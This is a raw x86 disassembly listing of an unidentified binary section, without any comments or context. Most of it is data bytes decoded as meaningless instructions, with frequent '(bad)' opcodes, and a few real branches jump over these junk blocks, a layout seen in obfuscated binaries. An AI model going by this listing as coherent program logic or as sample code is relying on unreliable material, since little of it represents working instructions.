  40b3a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3a5:	mul    BYTE PTR [eax+0x6625f34b]
  40b3ab:	icebp  
  40b3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ad:	mov    BYTE PTR [edi-0x72],al
  40b3b0:	jo     0x40b34d
  40b3b2:	sub    edx,DWORD PTR [eax+ebp*8-0x42]
  40b3b6:	mov    al,ds:0x6646db9a
  40b3bb:	xchg   esp,eax
  40b3bc:	dec    eax
  40b3bd:	mov    al,ds:0xb8c253ae
  40b3c2:	pop    esp
  40b3c3:	sub    DWORD PTR [edx-0x7d],ebp
  40b3c6:	push   ss
  40b3c7:	gs or  dh,cl
  40b3ca:	adc    BYTE PTR [edi+edx*1+0x5347a82e],bh
  40b3d1:	mov    eax,ds:0xc4c78181
  40b3d6:	inc    ebp
  40b3d7:	adc    esi,DWORD PTR [edx+0x35d0e05d]
  40b3dd:	push   0xffffffd2
  40b3df:	xor    DWORD PTR [esi+0x4c],ebp
  40b3e2:	xchg   edi,eax
  40b3e3:	sahf   
  40b3e4:	mov    DWORD PTR [edx-0xf237106],esp
  40b3ea:	dec    edx
  40b3eb:	jle    0x40b3a9
  40b3ed:	add    edi,DWORD PTR [esi+0x54]
  40b3f0:	and    BYTE PTR [edx+0x7d107f2a],ah
  40b3f6:	pop    esp
  40b3f7:	and    DWORD PTR [esi],0x7248bc56
  40b3fd:	jbe    0x40b39b
  40b3ff:	cdq    
  40b400:	aaa    
  40b401:	sub    ebx,edi
  40b403:	cmp    ebx,edx
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x2d
  40b425:	pop    eax
  40b426:	jle    0x40b44b
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b450
  40b431:	mov    eax,0x36bd5f3e
  40b436:	jmp    0x6178c001
  40b43b:	mov    bl,0x64
  40b43d:	test   BYTE PTR [ecx+ebp*1],bh
  40b440:	push   esp
  40b441:	pushf  
  40b442:	in     eax,0xa4
  40b444:	cwde   
  40b445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b446:	adc    edi,DWORD PTR [esp+edi*8+0x409a1cba]
  40b44d:	inc    DWORD PTR ds:0x985dfd0
  40b453:	scas   eax,DWORD PTR es:[edi]
  40b454:	arpl   WORD PTR [esi-0x2],sp
  40b457:	aam    0x1b
  40b459:	je     0x40b4b3
  40b45b:	hlt    
  40b45c:	mov    ah,0x85
  40b45e:	mov    ecx,ds
  40b460:	lock outs dx,DWORD PTR ds:[esi]
  40b462:	aaa    
  40b463:	aad    0xe8
  40b465:	loop   0x40b402
  40b467:	(bad)  
  40b468:	test   al,0x2
  40b46a:	imul   edx,DWORD PTR [ebp-0x531b7167],0x2d
  40b471:	ins    DWORD PTR es:[edi],dx
  40b472:	adc    al,BYTE PTR [ecx]
  40b474:	mov    al,0xd3
  40b476:	mov    cl,0xe1
  40b478:	setnp  BYTE PTR [edi+edi*4]
  40b47c:	mov    ecx,0x4c96ba9c
  40b481:	pop    ds
  40b482:	(bad)  
  40b483:	iret   
  40b484:	shl    BYTE PTR [eax],0xa7
  40b487:	inc    DWORD PTR [edx+esi*1+0x809683a]
  40b48e:	scas   eax,DWORD PTR es:[edi]
  40b48f:	psubb  mm5,QWORD PTR [ebx]
  40b492:	aaa    
  40b493:	stos   DWORD PTR es:[edi],eax
  40b494:	aas    
  40b495:	fcmovu st,st(6)
  40b497:	xchg   ebp,eax
  40b498:	pop    ss
  40b499:	and    eax,0x23b37166
  40b49e:	outs   dx,BYTE PTR ds:[esi]
  40b49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4a0:	or     eax,0x921b06c1
  40b4a5:	mov    ds:0xc124725a,al
  40b4aa:	retf   
  40b4ab:	push   edx
  40b4ac:	(bad)  
  40b4ad:	xor    al,0xe9
  40b4af:	xchg   ebx,eax
  40b4b0:	adc    BYTE PTR [edi+ebx*1],dl
  40b4b3:	retf   
  40b4b4:	ds dec eax
  40b4b6:	xor    DWORD PTR [edi-0x6e],esi
  40b4b9:	xor    cl,BYTE PTR [eax+ebx*2-0x2108dc07]
  40b4c0:	jmp    0x20c1:0x42637197
  40b4c7:	xchg   esi,eax
  40b4c8:	jl     0x40b4fb
  40b4ca:	mov    ah,0x1d
  40b4cc:	sub    BYTE PTR [edi+0x17],ah
  40b4cf:	inc    esp
  40b4d0:	jno    0x40b466
  40b4d2:	xor    eax,0xe0d9fe23
  40b4d7:	mov    ebp,DWORD PTR [eax+eiz*8]
  40b4da:	add    DWORD PTR [ecx],ebx
  40b4dc:	pop    esi
  40b4dd:	iret   
  40b4de:	mov    esi,0xb8224833
  40b4e3:	sbb    BYTE PTR [ecx+0x558ea0a6],0x7f
  40b4ea:	cmp    DWORD PTR [edi-0x32],edx
  40b4ed:	scas   eax,DWORD PTR es:[edi]
  40b4ee:	sbb    edx,DWORD PTR [esi+ebx*1]
  40b4f1:	stos   DWORD PTR es:[edi],eax
  40b4f2:	adc    bl,BYTE PTR [ebp-0x5eda9f12]
  40b4f8:	mov    edx,0xa8948e37
  40b4fd:	mov    ebp,0x3d7d25c8
  40b502:	mov    DWORD PTR [edx+0x4e],esp
  40b505:	push   esp
  40b506:	aas    
  40b507:	out    0x4,al
  40b509:	and    al,0x18
  40b50b:	jg     0x40b50f
  40b50d:	xchg   edx,eax
  40b50e:	or     al,0x47
  40b510:	scas   al,BYTE PTR es:[edi]
  40b511:	(bad)  
  40b513:	dec    edi
  40b514:	adc    eax,0x9dc30464
  40b519:	mul    ecx
  40b51b:	div    BYTE PTR [ebp-0x70]
  40b51e:	jl     0x40b4a9
  40b520:	not    BYTE PTR [edi+0x2d89d7b0]
  40b526:	imul   edx,eax,0x2fd3475d
  40b52c:	inc    ebx
  40b52d:	sbb    BYTE PTR [ebx+0xb],al
  40b530:	pop    esi
  40b531:	adc    cl,BYTE PTR ds:0x72ebb8f7
  40b537:	popf   
  40b538:	mov    dh,0x89
  40b53a:	leave  
  40b53b:	dec    esp
  40b53c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b53d:	push   esi
  40b53e:	leave  
  40b53f:	xor    ecx,DWORD PTR [edi+0x38c6c48c]
  40b545:	icebp  
  40b546:	test   al,0xec
  40b548:	adc    DWORD PTR [edx-0x56ca7180],edx
  40b54e:	xchg   ebp,eax
  40b54f:	mov    ch,0x93
  40b551:	jnp    0x40b55c
  40b553:	mov    ss,WORD PTR ss:0xd842d753
  40b55a:	test   DWORD PTR [ecx-0x5d],esi
  40b55d:	xchg   edx,eax
  40b55e:	sub    ebp,DWORD PTR [ebx-0x39]
  40b561:	retf   0xc0bd
  40b564:	shr    BYTE PTR [esi],1
  40b566:	add    dh,BYTE PTR ds:[eax+eiz*8+0x6d]
  40b56b:	shr    ebp,0xf7
  40b56e:	imul   BYTE PTR [edi+0x44]
  40b571:	(bad)  
  40b572:	mov    eax,ds:0x17c57ec7
  40b577:	push   eax
  40b578:	dec    edi
  40b579:	sbb    eax,0xd044e42f
  40b57e:	xchg   esi,eax
  40b57f:	sbb    al,0xb4
  40b581:	popa   
  40b582:	mov    edi,0x2c0faea4
  40b587:	jle    0x40b5f0
  40b589:	sub    al,0x29
  40b58b:	pusha  
  40b58c:	xchg   DWORD PTR [eax],eax
  40b58e:	into   
  40b58f:	sub    eax,0xde5d7a0c
  40b594:	inc    ecx
  40b595:	push   eax
  40b596:	or     DWORD PTR [esi+esi*2+0x41],edx
  40b59a:	dec    edi
  40b59b:	std    
  40b59c:	and    dl,dl
  40b59e:	push   edi
  40b59f:	lds    esp,FWORD PTR [eax+0x73852eb3]
  40b5a5:	jnp    0x40b575
  40b5a7:	mov    bl,0x43
  40b5a9:	mov    edi,DWORD PTR [ebp+0x32]
  40b5ac:	dec    ebx
  40b5ad:	add    BYTE PTR [edx+eiz*4+0x2a74f2d0],cl
  40b5b4:	push   eax
  40b5b5:	lds    ebx,FWORD PTR [ecx-0x27]
  40b5b8:	cmp    esi,esp
  40b5ba:	mov    ch,0x50
  40b5bc:	add    eax,DWORD PTR [edi+0x35c8c3ee]
  40b5c2:	fisub  DWORD PTR [ebx]
  40b5c4:	adc    BYTE PTR es:[edx],bl
  40b5c7:	adc    eax,0x87e96e8f
  40b5cc:	pop    ds
  40b5cd:	xor    eax,0x6d11c61f
  40b5d2:	nop
  40b5d3:	mov    ecx,0x9f8139fa
  40b5d8:	addr16 cwde 
  40b5da:	mov    ebx,0x4741b89
  40b5df:	xchg   esp,eax
  40b5e0:	sub    BYTE PTR [ebx],0x2d
  40b5e3:	ret    0xfe16
  40b5e6:	sub    eax,0xbf5bc67b
  40b5eb:	push   esp
  40b5ec:	pop    ebp
  40b5ed:	ins    BYTE PTR es:[edi],dx
  40b5ee:	fnstsw WORD PTR [edx]
  40b5f0:	cld    
  40b5f1:	in     eax,dx
  40b5f2:	push   cs
  40b5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5f4:	push   edi
  40b5f5:	scas   eax,DWORD PTR es:[edi]
  40b5f6:	or     ch,bh
  40b5f8:	fdivp  st(3),st
  40b5fa:	fs mov al,0xe4
  40b5fd:	es addr16 push cs
  40b600:	loopne 0x40b648
  40b602:	pop    ds
  40b603:	sbb    ebp,DWORD PTR [eax+0x146b3341]
  40b609:	jne    0x40b5a2
  40b60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b60c:	ja     0x40b5db
  40b60e:	or     eax,ecx
  40b610:	inc    ebp
  40b611:	mov    DWORD PTR [ebx+0x1f],eax
  40b614:	sahf   
  40b615:	dec    eax
  40b616:	test   eax,0xb30aedca
  40b61b:	xor    al,0xf1
  40b61d:	sar    ebx,0xcb
  40b620:	icebp  
  40b621:	cmp    eax,0xdfd9bef8
  40b626:	mov    al,ds:0xe1461093
  40b62b:	pushf  
  40b62c:	call   0x15f1:0x9b481923
  40b633:	pop    edx
  40b634:	mov    ebp,0x5dbde20
  40b639:	cmp    ecx,DWORD PTR [ebp-0x7e]
  40b63c:	mov    esp,0xfd3a3986
  40b641:	in     eax,0xa9
  40b643:	out    0x3d,al
  40b645:	lods   eax,DWORD PTR ds:[esi]
  40b646:	inc    eax
  40b647:	dec    ebp
  40b648:	lods   eax,DWORD PTR ds:[esi]
  40b649:	jecxz  0x40b5f3
  40b64b:	daa    
  40b64c:	mov    ebp,0xe9aec4d0
  40b651:	xor    DWORD PTR [esp+eiz*4+0x5a],edi
  40b655:	mul    dh
  40b657:	push   ebp
  40b658:	sub    DWORD PTR [edx-0x46a8e745],ecx
  40b65e:	pusha  
  40b65f:	int    0xc6
  40b661:	sub    bl,BYTE PTR cs:[eax]
  40b664:	adc    edi,esi
  40b666:	test   BYTE PTR [ebp+ebx*4-0x544246b7],dl
  40b66d:	fs adc bl,bh
  40b670:	lods   eax,DWORD PTR ds:[esi]
  40b671:	dec    esp
  40b672:	pop    ds
  40b673:	xchg   esi,eax
  40b674:	lods   al,BYTE PTR ds:[esi]
  40b675:	inc    ebp
  40b676:	addr16 repz pushf 
  40b679:	outs   dx,BYTE PTR ds:[esi]
  40b67a:	out    0xff,eax
  40b67c:	sub    dh,BYTE PTR ds:0x23239cff
  40b682:	(bad)  
  40b683:	sbb    BYTE PTR ds:0xa3373df2,cl
  40b689:	jl     0x40b704
  40b68b:	lock dec ebp
  40b68d:	dec    eax
  40b68e:	iret   
  40b68f:	fcmovnu st,st(7)
  40b691:	dec    ebp
  40b692:	hlt    
  40b693:	sbb    edi,ebp
  40b695:	pop    es
  40b696:	sahf   
  40b697:	std    
  40b698:	out    0x1a,al
  40b69a:	int    0xf0
  40b69c:	bswap  esp
  40b69e:	sub    esi,edx
  40b6a0:	lahf   
  40b6a1:	(bad)  
  40b6a2:	and    al,0x4d
  40b6a4:	cli    
  40b6a5:	rcr    DWORD PTR [ebx+0x4ba30236],1
  40b6ab:	cld    
  40b6ac:	retf   
  40b6ad:	pop    ebx
  40b6ae:	and    esp,0xdbb50fc2
  40b6b4:	or     ch,al
  40b6b6:	mov    esi,0xa972fb93
  40b6bb:	fdiv   DWORD PTR [ecx]
  40b6bd:	leave  
  40b6be:	imul   esp,DWORD PTR [edx+ebx*2],0xf39d3a93
  40b6c5:	test   DWORD PTR [edi+0x4c],0x39e0bc74
  40b6cc:	in     al,dx
  40b6cd:	aas    
  40b6ce:	dec    esi
  40b6cf:	adc    eax,0x96c5aadc
  40b6d4:	xchg   ecx,eax
  40b6d5:	and    esi,DWORD PTR [eax]
  40b6d7:	aad    0x43
  40b6d9:	enter  0xe281,0xbe
  40b6dd:	mov    bl,0x4e
  40b6df:	call   0x87b34adf
  40b6e4:	aam    0xd5
  40b6e6:	nop
  40b6e7:	mov    ds:0x161d9ca4,eax
  40b6ec:	(bad)  
  40b6ed:	inc    edx
  40b6ee:	addr16 adc ah,dl
  40b6f1:	shl    DWORD PTR [ebp-0x46],cl
  40b6f4:	aad    0xdb
  40b6f6:	clc    
  40b6f7:	clc    
  40b6f8:	imul   edx,DWORD PTR [ecx],0xdd2c4577
  40b6fe:	mov    ebx,0x1a5767da
  40b703:	ss in  al,dx
  40b705:	scas   al,BYTE PTR es:[edi]
  40b706:	les    ebp,FWORD PTR [ecx+0x1a]
  40b709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b70a:	or     al,0x1c
  40b70c:	(bad)  
  40b70d:	je     0x40b698
  40b70f:	xchg   ebp,eax
  40b710:	lods   eax,DWORD PTR ds:[esi]
  40b711:	ror    BYTE PTR [edi-0x51],cl
  40b714:	mov    esi,0xb5311e30
  40b719:	sbb    ah,BYTE PTR [eax]
  40b71b:	and    eax,0xa8919552
  40b720:	add    eax,DWORD PTR [ecx-0x651064db]
  40b726:	sub    DWORD PTR [ecx],edi
  40b728:	ret    0x24fe
  40b72b:	mov    WORD PTR [ebp-0x4ef0b20b],fs
  40b731:	xchg   ecx,eax
  40b732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b733:	dec    edi
  40b734:	xor    DWORD PTR [edx-0x3d50f191],esp
  40b73a:	push   ds
  40b73b:	mov    dl,0x85
  40b73d:	push   ecx
  40b73e:	test   al,0x13
  40b740:	push   edi
  40b741:	enter  0x6971,0x44
  40b745:	pop    ss
  40b746:	loope  0x40b6cd
  40b748:	jp     0x40b74c
  40b74a:	pop    ebx
  40b74b:	sbb    al,BYTE PTR [ebx-0x3663d3e1]
  40b751:	pusha  
  40b752:	shl    BYTE PTR [edx],1
  40b754:	scas   al,BYTE PTR es:[edi]
  40b755:	lods   eax,DWORD PTR ds:[esi]
  40b756:	inc    eax
  40b757:	loope  0x40b7bd
  40b759:	sti    
  40b75a:	pop    es
  40b75b:	or     edi,edx
  40b75d:	stc    
  40b75e:	cmp    ebp,DWORD PTR [ecx+0x6]
  40b761:	int3   
  40b762:	jp     0x40b758
  40b764:	cmp    BYTE PTR ds:0x73365da2,dl
  40b76a:	gs jae 0x40b77a
  40b76d:	mov    esp,0x96cf8d2e
  40b772:	inc    ebx
  40b773:	cdq    
  40b774:	(bad)  
  40b775:	push   ebx
  40b776:	into   
  40b777:	mov    al,0xf
  40b779:	jnp    0x40b786
  40b77b:	(bad)  
  40b77c:	adc    eax,0x2b9ddc62
  40b781:	(bad)  
  40b782:	jmp    0x40b70a
  40b784:	push   ebp
  40b785:	cmp    ch,dl
  40b787:	pop    ds
  40b788:	sub    al,0xc2
  40b78a:	xor    eax,0xdd37373a
  40b78f:	or     ecx,DWORD PTR [eax+0x5]
  40b792:	push   esp
  40b793:	sbb    bl,dl
  40b795:	jns    0x40b742
  40b797:	test   DWORD PTR [edx],edx
  40b799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b79a:	mov    esi,DWORD PTR [ecx-0x6c449975]
  40b7a0:	test   al,0x10
  40b7a2:	xchg   ebp,eax
  40b7a3:	pop    edi
  40b7a4:	adc    ebp,DWORD PTR [ecx+0x473d7f6f]
  40b7aa:	loope  0x40b79f
  40b7ac:	aam    0xf4
  40b7ae:	fwait
  40b7af:	add    eax,0xc8241875
  40b7b4:	push   eax
  40b7b5:	in     al,dx
  40b7b6:	mov    ah,0x36
  40b7b8:	jns    0x40b824
  40b7ba:	leave  
  40b7bb:	inc    eax
  40b7bc:	nop
  40b7bd:	outs   dx,DWORD PTR ds:[esi]
  40b7be:	sub    bl,BYTE PTR [eax+ebp*1+0x4385c19d]
  40b7c5:	and    cl,BYTE PTR [edi+0x397ae032]
  40b7cb:	adc    al,0x94
  40b7cd:	int3   
  40b7ce:	sbb    BYTE PTR [bp+di],0xa7
  40b7d2:	jg     0x40b7e2
  40b7d4:	push   ebx
  40b7d5:	and    ah,BYTE PTR [edx-0x17ef02fe]
  40b7db:	push   edx
  40b7dc:	adc    esi,edx
  40b7de:	xchg   ecx,eax
  40b7df:	(bad)  
  40b7e0:	out    0x19,eax
  40b7e2:	jns    0x40b7ca
  40b7e4:	div    DWORD PTR [ebx+0x5c]
  40b7e7:	jne    0x40b7e9
  40b7e9:	ja     0x40b85f
  40b7eb:	inc    esp
  40b7ec:	outs   dx,BYTE PTR ds:[esi]
  40b7ed:	(bad)  
  40b7ee:	pop    ebp
  40b7ef:	adc    eax,0x51f1f362
  40b7f4:	movlps QWORD PTR [ecx+0x4b],xmm3
  40b7f8:	xor    DWORD PTR [ebx-0x68],edi
  40b7fb:	in     eax,dx
  40b7fc:	sbb    DWORD PTR [ecx+0x41a490cc],esp
  40b802:	leave  
  40b803:	cmp    esi,DWORD PTR [ebx+0x53]
  40b806:	adc    ebx,DWORD PTR [ebx]
  40b808:	mov    al,ds:0xdffbad9d
  40b80d:	pusha  
  40b80e:	fnstsw WORD PTR [eax]
  40b810:	sub    cl,BYTE PTR [esi+0x1d]
  40b813:	das    
  40b814:	jnp    0x40b812
  40b816:	ins    DWORD PTR es:[edi],dx
  40b817:	add    BYTE PTR ds:0x38d5c010,bl
  40b81d:	push   esp
  40b81e:	xor    esi,esp
  40b820:	sbb    DWORD PTR [ecx+ebx*8+0x56],eax
  40b824:	ret    0x6ca8
  40b827:	pop    ds
  40b828:	mov    bh,0x67
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	mov    ds:0xe26fad05,eax
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b866
  40b8b1:	jge    0x40b86b
  40b8b3:	rol    BYTE PTR [eax-0x521e7c78],cl
  40b8b9:	je     0x40b883
  40b8bb:	in     eax,0x13
  40b8bd:	cmc    
  40b8be:	ret    0x76ea
  40b8c1:	ret    
  40b8c2:	jl     0x40b872
  40b8c4:	(bad)  
  40b8c5:	clc    
  40b8c6:	ss push ecx
  40b8c8:	pop    es
  40b8c9:	out    dx,eax
  40b8ca:	mov    ds:0x37762691,eax
  40b8cf:	idiv   edi
  40b8d1:	mov    cs,WORD PTR [esi-0x3580c93a]
  40b8d7:	mov    edi,gs
  40b8d9:	adc    DWORD PTR [eax-0x7a],ecx
  40b8dc:	das    
  40b8dd:	pop    ecx
  40b8de:	add    esp,DWORD PTR [edx]
  40b8e0:	mov    esi,0x73bc4de9
  40b8e5:	or     eax,0xa6417270
  40b8ea:	out    dx,al
  40b8eb:	lds    ebp,FWORD PTR [esi+0x29576b88]
  40b8f1:	popf   
  40b8f2:	repz pusha 
  40b8f4:	mov    ds:0x5fb2278a,al
  40b8f9:	push   esp
  40b8fa:	mov    eax,DWORD PTR [ecx]
  40b8fc:	inc    esi
  40b8fd:	sbb    BYTE PTR [edx],0x5d
  40b900:	ret    0x503f
  40b903:	cmp    ebx,esi
  40b905:	adc    DWORD PTR [ecx],edi
  40b907:	jl     0x40b8d3
  40b909:	das    
  40b90a:	push   ecx
  40b90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b90c:	jbe    0x40b8f3
  40b90e:	mov    ds:0xd1dacf9c,al
  40b913:	dec    esi
  40b914:	shl    DWORD PTR [ebx+0x5de3a51],cl
  40b91a:	mov    ebx,0x51c484aa
  40b91f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40b921:	shld   edx,edx,cl
  40b924:	pop    ecx
  40b925:	aad    0xcd
  40b927:	aam    0x83
  40b929:	sbb    eax,0x2984bc5c
  40b92e:	jne    0x40b948
  40b930:	and    esp,edx
  40b932:	sub    DWORD PTR [ebp+0x62b58b64],ebp
  40b938:	mov    ebp,0xd23d01cf
  40b93d:	fsubr  DWORD PTR [edi-0x5eedc2b5]
  40b943:	test   BYTE PTR [eax+0x26],bh
  40b946:	sub    DWORD PTR [esi+edx*1+0x5b3c9c7d],esp
  40b94d:	hlt    
  40b94e:	enter  0x30d6,0xad
  40b952:	sub    DWORD PTR [eax-0x7a40b571],esi
  40b958:	hlt    
  40b959:	sti    
  40b95a:	xchg   edx,eax
  40b95b:	xchg   esi,eax
  40b95c:	cmp    al,0x11
  40b95e:	arpl   WORD PTR [ebx+0x5f],sp
  40b961:	imul   esp,eax,0x79
  40b964:	jae    0x40b9cb
  40b966:	mov    edx,0x3530c5d0
  40b96b:	mov    cl,0xec
  40b96d:	jle    0x40b9ab
  40b96f:	ja     0x40b9e4
  40b971:	sar    BYTE PTR [ecx+0x2a],0x70
  40b975:	cld    
  40b976:	inc    eax
  40b977:	sahf   
  40b978:	or     al,0xfe
  40b97a:	mov    cl,0x2d
  40b97c:	imul   edx,ebx,0x6c
  40b97f:	jg     0x40b9db
  40b981:	fxch   st(5)
  40b983:	and    al,0xc8
  40b985:	test   DWORD PTR [ebx],ecx
  40b987:	ret    0x4959
  40b98a:	sbb    bl,ch
  40b98c:	rcl    dl,0x5
  40b98f:	mov    ds:0x5eb28d19,eax
  40b994:	ins    BYTE PTR es:[edi],dx
  40b995:	dec    ebx
  40b996:	fldz   
  40b998:	push   ebx
  40b999:	test   eax,0x6245275b
  40b99e:	lea    ebx,[esi+0x2f]
  40b9a1:	shl    DWORD PTR [edi-0x3b20624a],0xea
  40b9a8:	lahf   
  40b9a9:	mov    eax,ds:0x4fee7173
  40b9ae:	or     BYTE PTR [ebx-0x5b6c621],bl
  40b9b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b5:	popf   
  40b9b6:	js     0x40b992
  40b9b8:	and    DWORD PTR [edx-0x5f],edi
  40b9bb:	scas   eax,DWORD PTR es:[edi]
  40b9bc:	sub    BYTE PTR cs:[esp+edi*4],0x7a
  40b9c1:	fndisi(8087 only) 
  40b9c3:	jns    0x40b9c1
  40b9c5:	pusha  
  40b9c6:	outs   dx,DWORD PTR ds:[esi]
  40b9c7:	nop    DWORD PTR [edi]
  40b9ca:	mov    bl,0x94
  40b9cc:	lahf   
  40b9cd:	xor    al,0x7c
  40b9cf:	adc    BYTE PTR [edi+0x60],ah
  40b9d2:	mov    ah,0x82
  40b9d4:	mov    esp,0x2d175b56
  40b9d9:	aad    0x23
  40b9db:	fmul   DWORD PTR [edi-0x210a1202]
  40b9e1:	mov    dl,0xf6
  40b9e3:	mov    ebx,0x36d86c9b
  40b9e8:	int    0xe4
  40b9ea:	push   eax
  40b9eb:	sbb    al,0x45
  40b9ed:	(bad)  
  40b9ef:	or     edi,esi
  40b9f1:	mov    al,0x99
  40b9f3:	in     al,0xdd
  40b9f5:	mov    ds:0xfbcfad6,al
  40b9fa:	jne    0x40ba29
  40b9fc:	add    DWORD PTR gs:[ebp+0x43],0x1f
  40ba01:	loop   0x40b9a8
  40ba03:	xor    bl,BYTE PTR [esp+eax*1]
  40ba06:	pushf  
  40ba07:	mov    ebp,0xc64d48d7
  40ba0c:	mov    eax,ds:0xb8657238
  40ba11:	mov    dl,0xc1
  40ba13:	out    dx,al
  40ba14:	shr    DWORD PTR [esi-0x4b],cl
  40ba17:	rcr    BYTE PTR [esi+0xd],0xa1
  40ba1b:	rcr    ebp,1
  40ba1d:	(bad)  
  40ba1e:	cwde   
  40ba1f:	call   0x7869a163
  40ba24:	sub    cl,ch
  40ba26:	cmp    al,0x57
  40ba28:	je     0x40ba4e
  40ba2a:	sub    eax,0xdb15a52a
  40ba2f:	stos   BYTE PTR es:[edi],al
  40ba30:	xor    eax,0x43e016ee
  40ba35:	sbb    eax,0x5efbc7d7
  40ba3a:	jmp    0x55b0b0e5
  40ba3f:	lods   eax,DWORD PTR ds:[esi]
  40ba40:	je     0x40b9d2
  40ba42:	mov    DWORD PTR [ebp+0x63],edi
  40ba45:	ins    DWORD PTR es:[edi],dx
  40ba46:	faddp  st(4),st
  40ba48:	hlt    
  40ba49:	xchg   edi,eax
  40ba4a:	dec    edx
  40ba4b:	stos   BYTE PTR es:[edi],al
  40ba4c:	jecxz  0x40ba00
  40ba4e:	enter  0xfe3d,0x4
  40ba52:	fsub   DWORD PTR [edi-0x19]
  40ba55:	gs mov bh,0x35
  40ba58:	call   0xc50f0536
  40ba5d:	adc    ch,BYTE PTR [edi]
  40ba5f:	outs   dx,DWORD PTR ds:[esi]
  40ba60:	dec    eax
  40ba61:	std    
  40ba62:	clc    
  40ba63:	xor    esp,DWORD PTR es:[edi+0x61]
  40ba67:	mov    ss,WORD PTR [ebp-0x4e11f9e3]
  40ba6d:	mov    eax,0x746e2f45
  40ba72:	dec    ebx
  40ba73:	popa   
  40ba74:	pop    esp
  40ba76:	cmp    ebp,DWORD PTR [esp+ebp*2]
  40ba79:	mov    ebx,0xc6a90905
  40ba7e:	jnp    0x40ba39
  40ba80:	mov    ebx,0xc5d1392f
  40ba85:	sub    al,0x63
  40ba87:	jno    0x40ba39
  40ba89:	add    ecx,ebx
  40ba8b:	mov    dh,0x98
  40ba8d:	in     eax,0xa2
  40ba8f:	xchg   ebp,eax
  40ba90:	popf   
  40ba91:	dec    esp
  40ba92:	js     0x40ba2c
  40ba94:	iret   
  40ba95:	fs loope 0x40ba68
  40ba98:	fs push 0xfb99a36f
  40ba9e:	xchg   ch,ch
  40baa0:	and    eax,0xabe9d1f2
  40baa5:	cli    
  40baa6:	jge    0x40bb23
  40baa8:	lds    eax,FWORD PTR [esi-0x5d]
  40baab:	push   edi
  40baac:	add    al,0xb4
  40baae:	mov    al,0xaf
  40bab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab2:	cmp    al,0x40
  40bab4:	pop    esi
  40bab5:	lods   al,BYTE PTR ds:[esi]
  40bab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab7:	fidiv  DWORD PTR [ebx]
  40bab9:	add    BYTE PTR [edx+edx*8],al
  40babc:	mov    edx,0xbf2c1de9
  40bac1:	int3   
  40bac2:	jg     0x40bad8
  40bac4:	mov    eax,ds:0x99e73be6
  40bac9:	xor    al,0xd7
  40bacb:	ins    BYTE PTR es:[edi],dx
  40bacc:	jp     0x40bb08
  40bace:	in     eax,0xa1
  40bad0:	dec    ebp
  40bad1:	sub    al,0x5a
  40bad3:	cli    
  40bad4:	je     0x40baf3
  40bad6:	jl     0x40ba9c
  40bad8:	dec    eax
  40bad9:	sahf   
  40bada:	adc    eax,0x6b41ae8c
  40badf:	ins    BYTE PTR es:[edi],dx
  40bae0:	ror    edx,0xf9
  40bae3:	iret   
  40bae4:	cmp    eax,0xfac826b6
  40bae9:	add    eax,0x729279cb
  40baee:	xor    cl,BYTE PTR [edi-0x358787db]
  40baf4:	jae    0x40bb39
  40baf6:	pusha  
  40baf7:	fst    QWORD PTR [ebx]
  40baf9:	test   DWORD PTR [ecx+0x222ff27],edx
